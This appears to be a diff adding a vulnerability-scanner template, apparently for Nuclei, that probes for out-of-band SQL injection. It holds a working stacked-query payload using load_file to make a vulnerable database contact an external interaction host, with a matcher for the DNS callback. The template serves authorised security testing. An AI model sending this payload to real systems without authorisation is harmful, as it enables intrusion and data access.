@@ -1,0 +1,18 @@
+id: sqli-oast-dns
+
+info:
+  name: SQLi Out-of-Band (OAST)
+  severity: critical
+  author: reewardius
+  tags: sqli,oast
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1;SELECT+load_file('\\\\{{interactsh-url}}\\\\x')"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
